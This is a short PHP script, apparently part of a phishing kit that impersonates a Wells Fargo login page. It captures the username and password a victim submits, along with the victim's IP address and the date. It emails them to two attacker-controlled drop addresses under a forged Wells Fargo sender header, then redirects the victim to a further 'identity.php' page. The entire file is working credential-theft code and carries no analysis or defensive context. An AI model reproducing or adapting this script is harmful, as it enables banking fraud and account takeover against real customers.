<?
$ip = getenv("REMOTE_ADDR");
$adddate =date("D M d, Y g:i a");
$message .= " =================== Wells Fargo ================\n";
$message .= "Username: ".$_POST['west']."\n";
$message .= "Password: ".$_POST['girl']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= " ================== Great WeStGiRl ================\n";



$send = "box.result2018@yandex.com,box.result2018@outlook.com";
$subject = "Wells Fargo login | $ip";
$headers = "From: Wells Fargo<info@wellsfargo.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
       mail($cc,$subject,$message,$headers);


header("Location: identity.php");
?>
